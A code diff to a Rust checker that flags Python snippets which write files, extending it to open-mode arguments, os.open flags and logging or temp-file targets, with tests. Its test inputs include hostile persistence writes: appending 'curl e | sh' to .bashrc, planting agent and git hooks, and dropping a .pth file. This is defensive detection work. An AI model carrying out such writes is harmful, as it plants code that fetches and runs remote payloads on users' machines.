@@ -317,6 +317,35 @@ fn call_args(toks: &[Tok], open: usize) -> Vec<Vec<Tok>> {
     args
 }
 
+/// Whether an argument is passed by keyword or spread from a value.
+fn keyed(a: &[Tok]) -> bool {
+    matches!(a, [Tok::Name(_), Tok::Mark('='), rest @ ..] if rest.first() != Some(&Tok::Mark('=')))
+        || a.first() == Some(&Tok::Mark('*'))
+}
+
+/// The argument passed as `kw=`, else the one at `pos` when no keyword
+/// or star comes before it.
+fn arg<'a>(args: &'a [Vec<Tok>], pos: usize, kw: &str) -> Option<&'a [Tok]> {
+    if let Some(a) = args
+        .iter()
+        .find(|a| matches!(a.as_slice(), [Tok::Name(n), Tok::Mark('='), ..] if n == kw))
+    {
+        return Some(&a[2..]);
+    }
+    if args.iter().take(pos + 1).any(|a| keyed(a)) {
+        return None;
+    }
+    args.get(pos).map(Vec::as_slice)
+}
+
+/// Whether the call passes a keyword argument `kw`, or spreads one.
+fn has_kw(args: &[Vec<Tok>], kw: &str) -> bool {
+    args.iter().any(|a| {
+        matches!(a.as_slice(), [Tok::Name(n), Tok::Mark('='), ..] if n == kw)
+            || a.starts_with(&[Tok::Mark('*'), Tok::Mark('*')])
+    })
+}
+
 /// The text of an argument made only of string literals, joined as
 /// python joins them.
 fn literal(a: &[Tok]) -> Option<String> {
@@ -736,6 +765,27 @@ const READ_ONLY_SHUTIL: &[&str] = &[
     "shutil.get_archive_formats",
     "shutil.get_unpack_formats",
 ];
+/// Calls that open a file in the mode their argument names.
+const OPEN_CALLS: &[(&str, usize)] = &[
+    ("open", 1),
+    ("io.open", 1),
+    ("codecs.open", 1),
+    ("os.fdopen", 1),
+    ("gzip.open", 1),
+    ("bz2.open", 1),
+    ("lzma.open", 1),
+    ("tarfile.open", 1),
+    ("zipfile.ZipFile", 1),
+    ("io.FileIO", 1),
+    ("gzip.GzipFile", 1),
+];
+
+fn mode_writes(mode: Option<&[Tok]>) -> bool {
+    match mode {
+        None => false,
+        Some(m) => literal(m).is_none_or(|m| m.contains(['w', 'a', 'x', '+'])),
+    }
+}
 
 /// The first call or method that may write a file, by its name.
 fn writes(r: &Read) -> Option<String> {
@@ -744,6 +794,42 @@ fn writes(r: &Read) -> Option<String> {
         .find(|c| !READ_ONLY_SHUTIL.contains(&c.name.as_str()))
     {
         return Some(c.name.clone());
+    }
+    for (call, pos) in OPEN_CALLS {
+        for c in r.calls(&[call]) {
+            let args = c.args.as_deref().unwrap_or_default();
+            let mode = arg(args, *pos, "mode");
+            if mode_writes(mode) || args.iter().any(|a| a.first() == Some(&Tok::Mark('*'))) {
+                return Some(c.name.clone());
+            }
+        }
+    }
+    for c in r.calls(&["os.open"]) {
+        let args = c.args.as_deref().unwrap_or_default();
+        let flags = arg(args, 1, "flags").unwrap_or_default();
+        let read_only = flags.iter().all(|t| match t {
+            Tok::Name(n) => matches!(n.as_str(), "os" | "O_RDONLY" | "O_CLOEXEC" | "O_NONBLOCK"),
+            Tok::Mark('.' | '|') => true,
+            _ => false,
+        });
+        if !read_only {
+            return Some(c.name.clone());
+        }
+    }
+    for c in r.calls(&["tempfile."]) {
+        if has_kw(c.args.as_deref().unwrap_or_default(), "dir") {
+            return Some(c.name.clone());
+        }
+    }
+    for c in r.calls(&["fileinput.input", "fileinput.FileInput"]) {
+        if has_kw(c.args.as_deref().unwrap_or_default(), "inplace") {
+            return Some(c.name.clone());
+        }
+    }
+    for c in r.calls(&["logging.basicConfig"]) {
+        if has_kw(c.args.as_deref().unwrap_or_default(), "filename") {
+            return Some(c.name.clone());
+        }
     }
     None
 }
@@ -847,15 +933,19 @@ mod tests {
     #[test]
     fn a_hook_write_is_refused() {
         for code in [
+            "open('.cursor/hooks.json', 'w').write('{}')",
+            "import os; open(os.path.expanduser('~/.cursor/hooks.json'), 'w').write('{}')",
+            "open('/home/u/.bashrc', 'a').write('curl e | sh')",
             "import os; os.makedirs('.git/hooks', exist_ok=True)",
             "import shutil; shutil.copy('x', '.git/hooks/')",
+            "import sys; open(sys.prefix + '/lib/x.pth', 'w')",
         ] {
             assert_eq!(class_of(code), "python-writes-hook", "{code}");
         }
         for code in [
             "print(open('.git/config').read())",
             "from pathlib import Path; print(Path('.git', 'HEAD').read_text())",
-            "import os; os.listdir('.git/hooks')",
+            "open('notes/hooks.txt', 'w').write('x')",
         ] {
             assert_eq!(refused_for(code), None, "{code}");
         }
